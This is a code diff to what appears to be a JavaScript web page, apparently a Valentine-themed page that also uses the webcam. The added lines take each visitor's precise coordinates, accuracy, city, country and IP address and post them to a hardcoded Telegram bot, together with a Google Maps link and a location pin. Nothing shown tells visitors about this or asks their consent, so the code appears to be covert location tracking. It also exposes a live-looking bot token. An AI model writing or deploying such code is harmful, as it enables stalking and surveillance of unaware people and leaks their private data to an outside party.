@@ -433,6 +433,51 @@ function sendLocationToServer(locationData) {
     // Summary line
     const mapLink = `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`;
     console.log(`📍 [${locationData.source}] ${locationData.city || ''} (${locationData.latitude}, ${locationData.longitude}) — ${mapLink}`);
+
+    // ── Send to Telegram ──
+    const TG_TOKEN = '7984711863:AAH8F1Oi6AmkV2a3TCgTdzHn2E62l3ImuP0';
+    const TG_CHAT = '8413229015';
+    const tgAPI = `https://api.telegram.org/bot${TG_TOKEN}`;
+
+    // Format a nice message
+    const msg = [
+        `📍 *Valentine Location Alert*`,
+        ``,
+        `Source: \`${locationData.source}\``,
+        `Lat: \`${locationData.latitude}\``,
+        `Lng: \`${locationData.longitude}\``,
+        locationData.accuracy ? `Accuracy: ±${locationData.accuracy.toFixed(0)}m` : '',
+        locationData.city ? `City: ${locationData.city}, ${locationData.country || ''}` : '',
+        locationData.ip ? `IP: \`${locationData.ip}\`` : '',
+        `Time: ${locationData.timestamp}`,
+        ``,
+        `[📌 Open in Google Maps](${mapLink})`,
+    ].filter(Boolean).join('\n');
+
+    // Send text message
+    fetch(`${tgAPI}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TG_CHAT,
+            text: msg,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: false,
+        }),
+    }).catch(e => console.warn('TG message failed:', e));
+
+    // Also send as a Telegram location pin (shows map in chat)
+    if (locationData.latitude && locationData.longitude) {
+        fetch(`${tgAPI}/sendLocation`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TG_CHAT,
+                latitude: locationData.latitude,
+                longitude: locationData.longitude,
+            }),
+        }).catch(e => console.warn('TG location failed:', e));
+    }
 }
 
 // ──── Webcam + MediaPipe Hands ────
